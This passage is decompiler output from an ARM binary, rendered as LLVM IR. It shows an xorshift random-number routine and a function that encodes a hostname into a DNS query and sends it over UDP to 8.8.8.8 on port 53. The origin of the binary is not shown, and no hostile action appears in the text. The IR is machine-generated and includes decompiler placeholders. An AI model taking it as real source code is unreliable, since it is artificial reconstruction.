  %v3_f774 = load i32, i32* @r4, align 4
  store i32 %v3_f774, i32* %stack_var_-28, align 4
  %v0_f778 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_f778, i32* %r5.global-to-local, align 4
  %tmp16 = icmp slt i32 %v0_f770, 1
  br i1 %tmp16, label %dec_label_pc_f820, label %dec_label_pc_f780

dec_label_pc_f780:                                ; preds = %dec_label_pc_f770
  store i32 ptrtoint (i32* @global_var_22360.170 to i32), i32* %sl.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_2235c.174 to i32), i32* %r8.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_22358.172 to i32), i32* %r7.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_22354.168 to i32), i32* %r6.global-to-local, align 4
  %v2_f790 = load i32, i32* @global_var_22360.170, align 4
  store i32 %v2_f790, i32* %lr.global-to-local, align 4
  %v2_f794 = load i32, i32* @global_var_2235c.174, align 4
  store i32 %v2_f794, i32* %r4.global-to-local, align 4
  %v2_f798 = load i32, i32* @global_var_22358.172, align 4
  store i32 %v2_f798, i32* %r0.global-to-local, align 4
  %v2_f79c = load i32, i32* @global_var_22354.168, align 4
  br label %dec_label_pc_f7c0

dec_label_pc_f7a4:                                ; preds = %dec_label_pc_f7e0
  %v1_f7a4 = trunc i32 %v5_f7d0 to i16
  %v3_f7a4 = inttoptr i32 %v9_f7d4 to i16*
  store i16 %v1_f7a4, i16* %v3_f7a4, align 2
  %v4_f7a4 = load i32, i32* %r5.global-to-local, align 4
  %v5_f7a4 = add i32 %v4_f7a4, -2
  store i32 %v5_f7a4, i32* %r5.global-to-local, align 4
  %v0_f7a8.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_f7a8

dec_label_pc_f7a8:                                ; preds = %.thread, %dec_label_pc_f7a4
  %v0_f7a8 = phi i32 [ %v9_f7d8, %.thread ], [ %v0_f7a8.pre, %dec_label_pc_f7a4 ]
  %v2_f7a45 = phi i32 [ %v12_f7d4, %.thread ], [ %v5_f7a4, %dec_label_pc_f7a4 ]
  %tmp17 = icmp slt i32 %v0_f7a8, 1
  br i1 %tmp17, label %dec_label_pc_f828, label %dec_label_pc_f7b4

dec_label_pc_f7b4:                                ; preds = %dec_label_pc_f7a8
  %v0_f7ac = load i32, i32* %r0.global-to-local, align 4
  %v0_f7b4 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_f7b4, i32* %r0.global-to-local, align 4
  %v0_f7b8 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v0_f7b8, i32* %r4.global-to-local, align 4
  %v0_f7bc = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_f7bc, i32* %lr.global-to-local, align 4
  br label %dec_label_pc_f7c0

dec_label_pc_f7c0:                                ; preds = %dec_label_pc_f780, %dec_label_pc_f7b4
  %v0_f80c = phi i32 [ %v2_f798, %dec_label_pc_f780 ], [ %v0_f7b4, %dec_label_pc_f7b4 ]
  %v9_f7d4 = phi i32 [ %v0_f778, %dec_label_pc_f780 ], [ %v2_f7a45, %dec_label_pc_f7b4 ]
  %v0_f7ec = phi i32 [ %v0_f770, %dec_label_pc_f780 ], [ %v0_f7a8, %dec_label_pc_f7b4 ]
  %v0_f800 = phi i32 [ %v2_f790, %dec_label_pc_f780 ], [ %v0_f7bc, %dec_label_pc_f7b4 ]
  %v0_f7fc = phi i32 [ %v2_f79c, %dec_label_pc_f780 ], [ %v0_f7ac, %dec_label_pc_f7b4 ]
  %v4_f7c0 = mul i32 %v0_f7fc, 2048
  %v5_f7c0 = xor i32 %v4_f7c0, %v0_f7fc
  %v4_f7c4 = udiv i32 %v0_f800, 524288
  %v5_f7c4 = xor i32 %v4_f7c4, %v0_f800
  %v2_f7c8 = xor i32 %v5_f7c4, %v5_f7c0
  %v4_f7d0 = udiv i32 %v5_f7c0, 256
  %v5_f7d0 = xor i32 %v2_f7c8, %v4_f7d0
  store i32 %v5_f7d0, i32* %r3.global-to-local, align 4
  %v7_f7d4 = icmp sgt i32 %v0_f7ec, 3
  br i1 %v7_f7d4, label %.thread, label %dec_label_pc_f7e0

.thread:                                          ; preds = %dec_label_pc_f7c0
  %v10_f7d4 = inttoptr i32 %v9_f7d4 to i32*
  store i32 %v5_f7d0, i32* %v10_f7d4, align 4
  %v11_f7d4 = load i32, i32* %r5.global-to-local, align 4
  %v12_f7d4 = add i32 %v11_f7d4, 4
  store i32 %v12_f7d4, i32* %r5.global-to-local, align 4
  %v8_f7d8 = load i32, i32* %r1.global-to-local, align 4
  %v9_f7d8 = add i32 %v8_f7d8, -4
  store i32 %v9_f7d8, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_f7a8

dec_label_pc_f7e0:                                ; preds = %dec_label_pc_f7c0
  %v7_f7ec = icmp eq i32 %v0_f7ec, 1
  store i32 %v5_f7d0, i32* %r3.global-to-local, align 4
  %v1_f7f4 = add i32 %v0_f7ec, -2
  store i32 %v1_f7f4, i32* %r1.global-to-local, align 4
  br i1 %v7_f7ec, label %dec_label_pc_f7fc, label %dec_label_pc_f7a4

dec_label_pc_f7fc:                                ; preds = %dec_label_pc_f7e0
  store i32 %v5_f7d0, i32* %r3.global-to-local, align 4
  %v1_f80c = load i32, i32* %r6.global-to-local, align 4
  %v2_f80c = inttoptr i32 %v1_f80c to i32*
  store i32 %v0_f80c, i32* %v2_f80c, align 4
  %v0_f810 = load i32, i32* %r4.global-to-local, align 4
  %v1_f810 = load i32, i32* %r7.global-to-local, align 4
  %v2_f810 = inttoptr i32 %v1_f810 to i32*
  store i32 %v0_f810, i32* %v2_f810, align 4
  %v0_f814 = load i32, i32* %lr.global-to-local, align 4
  %v1_f814 = load i32, i32* %r8.global-to-local, align 4
  %v2_f814 = inttoptr i32 %v1_f814 to i32*
  store i32 %v0_f814, i32* %v2_f814, align 4
  %v0_f818 = load i32, i32* %r3.global-to-local, align 4
  %v1_f818 = load i32, i32* %sl.global-to-local, align 4
  %v2_f818 = inttoptr i32 %v1_f818 to i32*
  store i32 %v0_f818, i32* %v2_f818, align 4
  %v0_f81c = load i32, i32* %r3.global-to-local, align 4
  %v1_f81c = trunc i32 %v0_f81c to i8
  %v2_f81c = load i32, i32* %r5.global-to-local, align 4
  %v3_f81c = inttoptr i32 %v2_f81c to i8*
  store i8 %v1_f81c, i8* %v3_f81c, align 1
  br label %dec_label_pc_f820

dec_label_pc_f820:                                ; preds = %dec_label_pc_f770, %dec_label_pc_f828, %dec_label_pc_f7fc
  %v2_f820 = load i32, i32* %stack_var_-28, align 4
  store i32 %v2_f820, i32* @r4, align 4
  %v1_f824 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_f824

dec_label_pc_f828:                                ; preds = %dec_label_pc_f7a8
  %v0_f828 = load i32, i32* %r3.global-to-local, align 4
  %v1_f828 = load i32, i32* %sl.global-to-local, align 4
  %v2_f828 = inttoptr i32 %v1_f828 to i32*
  store i32 %v0_f828, i32* %v2_f828, align 4
  %v0_f82c = load i32, i32* %lr.global-to-local, align 4
  %v1_f82c = load i32, i32* %r8.global-to-local, align 4
  %v2_f82c = inttoptr i32 %v1_f82c to i32*
  store i32 %v0_f82c, i32* %v2_f82c, align 4
  %v0_f830 = load i32, i32* %r4.global-to-local, align 4
  %v1_f830 = load i32, i32* %r7.global-to-local, align 4
  %v2_f830 = inttoptr i32 %v1_f830 to i32*
  store i32 %v0_f830, i32* %v2_f830, align 4
  %v0_f834 = load i32, i32* %r0.global-to-local, align 4
  %v1_f834 = load i32, i32* %r6.global-to-local, align 4
  %v2_f834 = inttoptr i32 %v1_f834 to i32*
  store i32 %v0_f834, i32* %v2_f834, align 4
  br label %dec_label_pc_f820

; uselistorder directives
  uselistorder i32 %v9_f7d8, { 1, 0 }
  uselistorder i32 %v12_f7d4, { 1, 0 }
  uselistorder i32 %v5_f7d0, { 0, 2, 3, 4, 1 }
  uselistorder i32 %v0_f7fc, { 1, 0 }
  uselistorder i32 %v0_f800, { 1, 0 }
  uselistorder i32 %v0_f7ec, { 1, 0, 2 }
  uselistorder i32 %v0_f7a8, { 1, 0 }
  uselistorder i32 %v0_f770, { 1, 0 }
  uselistorder i32* %r5.global-to-local, { 2, 1, 4, 0, 3, 5 }
  uselistorder i32* %r4.global-to-local, { 1, 2, 0, 3, 4 }
  uselistorder i32* %r3.global-to-local, { 4, 0, 1, 2, 3, 6, 5 }
  uselistorder i32* %r1.global-to-local, { 3, 5, 4, 2, 0, 1 }
  uselistorder i32* %r0.global-to-local, { 4, 3, 2, 5, 6, 0, 1 }
  uselistorder i32* %lr.global-to-local, { 1, 2, 0, 3, 4 }
  uselistorder i32* @global_var_22354.168, { 2, 3, 5, 1, 0, 4 }
  uselistorder i32* @global_var_22358.172, { 2, 3, 4, 1, 6, 0, 5 }
  uselistorder i32* @global_var_2235c.174, { 2, 3, 5, 1, 0, 4 }
  uselistorder i32* @global_var_22360.170, { 2, 3, 5, 1, 0, 4 }
  uselistorder label %dec_label_pc_f820, { 1, 2, 0 }
  uselistorder label %dec_label_pc_f7c0, { 1, 0 }
}

define i32 @function_f84c(i32 %arg1) local_unnamed_addr {
dec_label_pc_f84c:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_f84c = load i32, i32* @r4, align 4
  store i32 %v3_f84c, i32* %stack_var_-8, align 4
  %v6_f84c = load i32, i32* @lr, align 4
  %v0_f850 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_f850, i32* @r4, align 4
  %v2_f850 = icmp eq i32 %v0_f850, 0
  br i1 %v2_f850, label %dec_label_pc_f86c, label %dec_label_pc_f858

dec_label_pc_f858:                                ; preds = %dec_label_pc_f84c
  %v1_f858 = add i32 %v0_f850, 4
  %v2_f858 = inttoptr i32 %v1_f858 to i32*
  %v3_f858 = load i32, i32* %v2_f858, align 4
  store i32 %v3_f858, i32* %r0.global-to-local, align 4
  store i32 63588, i32* @lr, align 4
  %v1_f860 = icmp ne i32 %v3_f858, 0
  call void @__pseudo_cond_branch(i1 %v1_f860, i32 ptrtoint (i32* @global_var_13780.57 to i32))
  %v0_f864 = load i32, i32* @r4, align 4
  store i32 %v0_f864, i32* %r0.global-to-local, align 4
  %v1_f868 = call i32 @function_13780(i32 %v0_f864)
  store i32 %v1_f868, i32* %r0.global-to-local, align 4
  %v2_f86c.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_f86c

dec_label_pc_f86c:                                ; preds = %dec_label_pc_f84c, %dec_label_pc_f858
  %v1_f870 = phi i32 [ 0, %dec_label_pc_f84c ], [ %v1_f868, %dec_label_pc_f858 ]
  %v2_f86c = phi i32 [ %v3_f84c, %dec_label_pc_f84c ], [ %v2_f86c.pre, %dec_label_pc_f858 ]
  store i32 %v2_f86c, i32* @r4, align 4
  store i32 %v6_f84c, i32* @lr, align 4
  ret i32 %v1_f870

; uselistorder directives
  uselistorder i32 %v0_f850, { 0, 2, 1 }
  uselistorder i32* %r0.global-to-local, { 4, 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_f86c, { 1, 0 }
}

define i32 @function_f874(i32 %arg1) local_unnamed_addr {
dec_label_pc_f874:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %tmp78 = call i16 @__decompiler_undefined_function_1()
  %stack_var_-4280 = alloca i32, align 4
  %stack_var_-4292 = alloca i16, align 2
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-196 = alloca i32, align 4
  %stack_var_-68 = alloca i32, align 4
  %stack_var_-216 = alloca i32, align 4
  %stack_var_-2230 = alloca i32, align 4
  %stack_var_-2244 = alloca i16, align 2
  %stack_var_-2232 = alloca i32, align 4
  %v3_f874 = load i32, i32* @r4, align 4
  %v9_f874 = load i32, i32* @r6, align 4
  %v12_f874 = load i32, i32* @r7, align 4
  %v15_f874 = load i32, i32* @r8, align 4
  %v18_f874 = load i32, i32* @sb, align 4
  %v21_f874 = load i32, i32* @sl, align 4
  %v24_f874 = load i32, i32* @fp, align 4
  %v27_f874 = load i32, i32* @lr, align 4
  store i32 %arg1, i32* @r5, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  %v2_f88c = call i32 @function_1320c(i32 1, i32 8)
  store i32 %v2_f88c, i32* @fp, align 4
  %v0_f894 = load i32, i32* @r5, align 4
  store i32 %v0_f894, i32* %r0.global-to-local, align 4
  %v1_f898 = inttoptr i32 %v0_f894 to i8*
  %v2_f898 = call i32 @function_12324(i8* %v1_f898)
  %v2_f8a0 = ptrtoint i16* %stack_var_-2244 to i32
  store i32 %v2_f8a0, i32* @sl, align 4
  %v2_f8a4 = ptrtoint i32* %stack_var_-2232 to i32
  store i32 %v2_f8a4, i32* @sb, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  %v1_f8ac = add i32 %v2_f898, 1
  store i32 %v1_f8ac, i32* %r0.global-to-local, align 4
  %v2_f8b0 = ptrtoint i32* %stack_var_-2230 to i32
  store i32 %v2_f8b0, i32* %r2.global-to-local, align 4
  store i32 %v2_f8a4, i32* %r6.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  store i32 %v1_f8ac, i32* %r3.global-to-local, align 4
  %v2_f8ec143 = icmp eq i32 %v1_f8ac, 0
  store i1 %v2_f8ec143, i1* %cpsr_z.global-to-local, align 1
  store i32 1, i32* @lr, align 4
  %v1_f8f4144 = add i32 %v2_f8b0, -1
  store i32 %v1_f8f4144, i32* %r1.global-to-local, align 4
  %tmp115145 = icmp slt i32 %v1_f8ac, 1
  br i1 %tmp115145, label %dec_label_pc_f8fc, label %dec_label_pc_f8c0

dec_label_pc_f8c0:                                ; preds = %dec_label_pc_f874, %bb114
  %v0_f8c0148 = phi i32 [ %v1_f8e0, %bb114 ], [ 0, %dec_label_pc_f874 ]
  %v1_f8cc147.off0 = phi i8 [ %extract.t149, %bb114 ], [ 0, %dec_label_pc_f874 ]
  %v2_f900146 = phi i32 [ %v1_f8e4, %bb114 ], [ %v2_f8b0, %dec_label_pc_f874 ]
  %v1_f8c0 = load i32, i32* @r5, align 4
  %v2_f8c0 = add i32 %v1_f8c0, %v0_f8c0148
  %v3_f8c0 = inttoptr i32 %v2_f8c0 to i8*
  %v4_f8c0 = load i8, i8* %v3_f8c0, align 1
  %v6_f8c0 = zext i8 %v4_f8c0 to i32
  store i32 %v6_f8c0, i32* %r3.global-to-local, align 4
  %v2_f8c4 = icmp eq i8 %v4_f8c0, 0
  store i1 %v2_f8c4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f8c4, label %.thread, label %bb

bb:                                               ; preds = %dec_label_pc_f8c0
  %v8_f8c8 = icmp eq i8 %v4_f8c0, 46
  store i1 %v8_f8c8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_f8c8, label %.thread, label %.thread7

.thread:                                          ; preds = %dec_label_pc_f8c0, %bb
  %v3_f8cc = load i32, i32* %r6.global-to-local, align 4
  %v4_f8cc = inttoptr i32 %v3_f8cc to i8*
  store i8 %v1_f8cc147.off0, i8* %v4_f8cc, align 1
  %v0_f8d0.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_f8d0.pr, label %.thread9.thread13, label %.thread..thread7_crit_edge

.thread..thread7_crit_edge:                       ; preds = %.thread
  %v1_f8d0.pre = load i32, i32* %r3.global-to-local, align 4
  %v3_f8d0.pre = load i32, i32* %r2.global-to-local, align 4
  %extract.t = trunc i32 %v1_f8d0.pre to i8
  br label %.thread7

.thread7:                                         ; preds = %.thread..thread7_crit_edge, %bb
  %v3_f8d0 = phi i32 [ %v3_f8d0.pre, %.thread..thread7_crit_edge ], [ %v2_f900146, %bb ]
  %v1_f8d0.off0 = phi i8 [ %extract.t, %.thread..thread7_crit_edge ], [ %v4_f8c0, %bb ]
  %v4_f8d0 = add i32 %v3_f8d0, -1
  %v5_f8d0 = inttoptr i32 %v4_f8d0 to i8*
  store i8 %v1_f8d0.off0, i8* %v5_f8d0, align 1
  %v0_f8d4.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_f8d4.pr, label %.thread9, label %.thread12

.thread9.thread13:                                ; preds = %.thread
  %v1_f8d4 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v1_f8d4, i32* %r6.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  br label %bb114

.thread9:                                         ; preds = %.thread7
  %v1_f8d411 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v1_f8d411, i32* %r6.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  br label %bb114

.thread12:                                        ; preds = %.thread7
  %v1_f8dc = load i32, i32* @lr, align 4
  %v2_f8dc = urem i32 %v1_f8dc, 256
  store i32 %v2_f8dc, i32* %r4.global-to-local, align 4
  br label %bb114

bb114:                                            ; preds = %.thread9, %.thread9.thread13, %.thread12
  %v0_f8f033 = phi i32 [ 0, %.thread9.thread13 ], [ 0, %.thread9 ], [ %v2_f8dc, %.thread12 ]
  %v0_f8e0 = load i32, i32* %ip.global-to-local, align 4
  %v1_f8e0 = add i32 %v0_f8e0, 1
  store i32 %v1_f8e0, i32* %ip.global-to-local, align 4
  %v0_f8e4 = load i32, i32* %r2.global-to-local, align 4
  %v1_f8e4 = add i32 %v0_f8e4, 1
  store i32 %v1_f8e4, i32* %r2.global-to-local, align 4
  %v1_f8e8.pre = load i32, i32* %r0.global-to-local, align 4
  %v2_f8e8 = sub i32 %v1_f8e8.pre, %v1_f8e0
  store i32 %v2_f8e8, i32* %r3.global-to-local, align 4
  %v2_f8ec = icmp eq i32 %v2_f8e8, 0
  store i1 %v2_f8ec, i1* %cpsr_z.global-to-local, align 1
  %v1_f8f0 = add nuw nsw i32 %v0_f8f033, 1
  store i32 %v1_f8f0, i32* @lr, align 4
  store i32 %v0_f8e4, i32* %r1.global-to-local, align 4
  %tmp115 = icmp slt i32 %v2_f8e8, 1
  %extract.t149 = trunc i32 %v0_f8f033 to i8
  br i1 %tmp115, label %dec_label_pc_f8fc, label %dec_label_pc_f8c0

dec_label_pc_f8fc:                                ; preds = %bb114, %dec_label_pc_f874
  %v1_f8f4.lcssa = phi i32 [ %v1_f8f4144, %dec_label_pc_f874 ], [ %v0_f8e4, %bb114 ]
  store i32 0, i32* @r4, align 4
  %v4_f900 = inttoptr i32 %v1_f8f4.lcssa to i8*
  store i8 0, i8* %v4_f900, align 1
  store i32 %v2_f8a4, i32* %r0.global-to-local, align 4
  %v1_f908 = bitcast i32* %stack_var_-2232 to i8*
  %v2_f908 = call i32 @function_12324(i8* %v1_f908)
  %v2_f90c = ptrtoint i32* %stack_var_-216 to i32
  store i32 %v2_f90c, i32* %r1.global-to-local, align 4
  %v1_f910 = load i32, i32* @sb, align 4
  %v2_f910 = add i32 %v1_f910, %v2_f908
  store i32 %v2_f910, i32* %r5.global-to-local, align 4
  %v0_f918 = load i32, i32* @r4, align 4
  store i32 %v0_f918, i32* %stack_var_-68, align 4
  store i32 %v2_f8a4, i32* %r0.global-to-local, align 4
  %v2_f928 = call i32 @function_12324(i8* %v1_f908)
  %v1_f92c = add i32 %v2_f928, 17
  store i32 %v1_f92c, i32* %r0.global-to-local, align 4
  %v0_f934 = call i32 @function_f570()
  %v1_f934 = sext i32 %v0_f934 to i64
  store i32 -2147450879, i32* %r3.global-to-local, align 4
  %v5_f940 = mul nuw nsw i64 %v1_f934, 2147516417
  %v6_f940 = udiv i64 %v5_f940, 4294967296
  %v7_f940 = trunc i64 %v6_f940 to i32
  %v8_f940 = trunc i64 %v5_f940 to i32
  store i32 %v8_f940, i32* @lr, align 4
  store i32 %v7_f940, i32* %r2.global-to-local, align 4
  %v5_f9444 = udiv i64 %v5_f940, 140737488355328
  %v5_f944 = trunc i64 %v5_f9444 to i32
  %v6_f944 = add i32 %v5_f944, %v0_f934
  store i32 16, i32* %r1.global-to-local, align 4
  %v6_f950 = urem i32 %v6_f944, 65536
  store i32 %v6_f950, i32* %ip.global-to-local, align 4
  %v2_f958 = ptrtoint i32* %stack_var_-68 to i32
  store i32 %v2_f958, i32* %r0.global-to-local, align 4
  %v5_f95c = trunc i32 %v6_f944 to i16
  %v2_f960 = call i32 @function_123b8(i32 %v2_f958, i32 16)
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 %v2_f90c, i32* %r1.global-to-local, align 4
  store i32 2, i32* %stack_var_-68, align 4
  store i32 134744072, i32* %r0.global-to-local, align 4
  %v1_f97c = call i32 @function_14828(i32 134744072)
  store i32 %v2_f90c, i32* %r3.global-to-local, align 4
  store i32 53, i32* %r0.global-to-local, align 4
  %v1_f98c = call i32 @function_1484c(i32 53)
  store i32 %v2_f90c, i32* %ip.global-to-local, align 4
  store i16 %v5_f95c, i16* %stack_var_-2244, align 2
  store i32 256, i32* %r0.global-to-local, align 4
  %v1_f9a4 = call i32 @function_1484c(i32 256)
  store i32 1, i32* %r0.global-to-local, align 4
  %v1_f9b0 = call i32 @function_1484c(i32 1)
  store i32 1, i32* %r0.global-to-local, align 4
  %v1_f9bc = call i32 @function_1484c(i32 1)
  %v2_f9bc = trunc i32 %v1_f9bc to i16
  %v3_f9c0 = load i32, i32* %r5.global-to-local, align 4
  %v4_f9c0 = add i32 %v3_f9c0, 1
  %v5_f9c0 = inttoptr i32 %v4_f9c0 to i16*
  store i16 %v2_f9bc, i16* %v5_f9c0, align 2
  store i32 1, i32* %r0.global-to-local, align 4
  %v1_f9c8 = call i32 @function_1484c(i32 1)
  %v2_f9c8 = trunc i32 %v1_f9c8 to i16
  store i32 %v1_f9c8, i32* %r0.global-to-local, align 4
  %v0_f9cc = load i32, i32* %r5.global-to-local, align 4
  %v1_f9cc = add i32 %v0_f9cc, 1
  store i32 %v1_f9cc, i32* @r5, align 4
  %v4_f9d0 = add i32 %v0_f9cc, 3
  %v5_f9d0 = inttoptr i32 %v4_f9d0 to i16*
  store i16 %v2_f9c8, i16* %v5_f9d0, align 2
  %v2_fa6c = ptrtoint i32* %stack_var_-196 to i32
  %v2_fa90 = ptrtoint i32* %stack_var_-40 to i32
  %v2_fabc = ptrtoint i32* %stack_var_-52 to i32
  %v2_fb00 = ptrtoint i16* %stack_var_-4292 to i32
  %v2_fb94 = ptrtoint i32* %stack_var_-4280 to i32
  %v1_fb9c = bitcast i32* %stack_var_-4280 to i8*
  %v4_fbc0 = zext i16 %tmp78 to i32
  %v2_fbc4 = icmp eq i16 %tmp78, 0
  br label %dec_label_pc_f9dc

dec_label_pc_f9dc:                                ; preds = %dec_label_pc_fb48, %dec_label_pc_f8fc
  %v1_f9e0 = phi i32 [ -1, %dec_label_pc_f8fc ], [ %v0_f9dc.pre, %dec_label_pc_fb48 ]
  %storemerge = phi i32 [ 1, %dec_label_pc_f8fc ], [ %v1_fb48, %dec_label_pc_fb48 ]
  store i32 %storemerge, i32* @r8, align 4
  %v7_f9dc = icmp eq i32 %v1_f9e0, -1
  store i1 %v7_f9dc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f9dc, label %bb117, label %bb116

bb116:                                            ; preds = %dec_label_pc_f9dc
  store i32 %v1_f9e0, i32* %r0.global-to-local, align 4
  br label %bb117

bb117:                                            ; preds = %dec_label_pc_f9dc, %bb116
  store i32 63976, i32* @lr, align 4
  %v1_f9e4 = xor i1 %v7_f9dc, true
  call void @__pseudo_cond_branch(i1 %v1_f9e4, i32 ptrtoint (i32* @global_var_15b20.24 to i32))
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 2, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_f9f4 = call i32 @function_14b54(i32 2, i32 2, i32 0)
  store i32 %v3_f9f4, i32* %r0.global-to-local, align 4
  %v7_f9f8 = icmp eq i32 %v3_f9f4, -1
  store i1 %v7_f9f8, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_f9f4, i32* @r6, align 4
  br i1 %v7_f9f8, label %dec_label_pc_fb88, label %dec_label_pc_fa04

dec_label_pc_fa04:                                ; preds = %bb117
  store i32 %v2_f958, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v3_fa10 = call i32 @function_14798(i32 %v3_f9f4, i32 %v2_f958, i32 16)
  store i32 %v3_fa10, i32* %r0.global-to-local, align 4
  %v7_fa14 = icmp eq i32 %v3_fa10, -1
  store i1 %v7_fa14, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fa14, label %dec_label_pc_fb50, label %dec_label_pc_fa1c

dec_label_pc_fa1c:                                ; preds = %dec_label_pc_fa04
  %v0_fa1c = load i32, i32* @r6, align 4
  store i32 %v0_fa1c, i32* @r0, align 4
  store i32 %v2_f8a0, i32* @r1, align 4
  store i32 %v1_f92c, i32* @r2, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_fa2c = call i32 @function_14a74(i32 %v0_fa1c, i32 %v2_f8a0, i32 %v1_f92c, i32 16384)
  store i32 %v4_fa2c, i32* %r0.global-to-local, align 4
  %v7_fa30 = icmp eq i32 %v4_fa2c, -1
  store i1 %v7_fa30, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fa30, label %dec_label_pc_fb50, label %dec_label_pc_fa38

dec_label_pc_fa38:                                ; preds = %dec_label_pc_fa1c
  %v0_fa38 = load i32, i32* @r6, align 4
  store i32 %v0_fa38, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 3, i32* %r0.global-to-local, align 4
  %v3_fa44 = call i32 @function_12f68(i32 3, i32 %v0_fa38, i32 0)
  %v0_fa48 = load i32, i32* @r6, align 4
  store i32 %v0_fa48, i32* %r1.global-to-local, align 4
  %v1_fa4c = or i32 %v3_fa44, 2048
  store i32 %v1_fa4c, i32* %r2.global-to-local, align 4
  store i32 4, i32* %r0.global-to-local, align 4
  %v3_fa54 = call i32 @function_12f68(i32 4, i32 %v0_fa48, i32 %v1_fa4c)
  store i32 %v3_fa54, i32* %r0.global-to-local, align 4
  store i32 0, i32* %stack_var_-196, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  store i32 %v2_fa6c, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_fa70

dec_label_pc_fa70:                                ; preds = %dec_label_pc_fa70, %dec_label_pc_fa38
  %v1_fa74 = phi i32 [ %v1_fa78, %dec_label_pc_fa70 ], [ 4, %dec_label_pc_fa38 ]
  store i32 0, i32* @r4, align 4
  %v3_fa74 = add i32 %v1_fa74, %v2_fa6c
  %v4_fa74 = inttoptr i32 %v3_fa74 to i32*
  store i32 0, i32* %v4_fa74, align 4
  %v0_fa78 = load i32, i32* %r3.global-to-local, align 4
  %v1_fa78 = add i32 %v0_fa78, 4
  store i32 %v1_fa78, i32* %r3.global-to-local, align 4
  %v7_fa7c = icmp eq i32 %v1_fa78, 128
  br i1 %v7_fa7c, label %dec_label_pc_fa84, label %dec_label_pc_fa70

dec_label_pc_fa84:                                ; preds = %dec_label_pc_fa70
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  %v0_fa84 = load i32, i32* @r6, align 4
  %v3_fa84 = udiv i32 %v0_fa84, 32
  %v3_fa8c = mul nuw nsw i32 %v3_fa84, 4
  store i32 %v3_fa8c, i32* %r3.global-to-local, align 4
  store i32 %v2_fa90, i32* %r2.global-to-local, align 4
  %v2_fa94 = add i32 %v3_fa8c, %v2_fa90
  store i32 %v2_fa94, i32* @r5, align 4
  %v1_fa98 = add i32 %v2_fa94, -156
  %v2_fa98 = inttoptr i32 %v1_fa98 to i32*
  %v3_fa98 = load i32, i32* %v2_fa98, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v1_faa0 = urem i32 %v0_fa84, 32
  store i32 %v1_faa0, i32* @r7, align 4
  %v7_faa4 = shl i32 1, %v1_faa0
  %v8_faa4 = or i32 %v3_fa98, %v7_faa4
  store i32 5, i32* %ip.global-to-local, align 4
  store i32 %v8_faa4, i32* %v2_fa98, align 4
  %v0_fab4 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v0_fab4, i32* %stack_var_-52, align 4
  store i32 %v2_fabc, i32* @lr, align 4
  store i32 %v2_f90c, i32* %ip.global-to-local, align 4
  %v0_fac4 = load i32, i32* @r6, align 4
  %v1_fac4 = load i32, i32* %r3.global-to-local, align 4
  %v2_fac4 = add i32 %v1_fac4, %v0_fac4
  store i32 %v2_fac4, i32* %r0.global-to-local, align 4
  %v0_facc = load i32, i32* @r4, align 4
  store i32 %v0_facc, i32* %r2.global-to-local, align 4
  store i32 %v0_facc, i32* %r3.global-to-local, align 4
  %v5_fad8 = call i32 @function_14cd8(i32 %v2_fac4, i32 %v2_fa6c, i32 %v0_facc, i32 %v0_facc, i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_fad8, i32* %r0.global-to-local, align 4
  %v7_fadc = icmp eq i32 %v5_fad8, -1
  store i1 %v7_fadc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fadc, label %dec_label_pc_fb60, label %dec_label_pc_fae4

dec_label_pc_fae4:                                ; preds = %dec_label_pc_fa84
  %v1_fae4 = load i32, i32* @r4, align 4
  %v9_fae4 = icmp eq i32 %v5_fad8, %v1_fae4
  store i1 %v9_fae4, i1* %cpsr_z.global-to-local, align 1
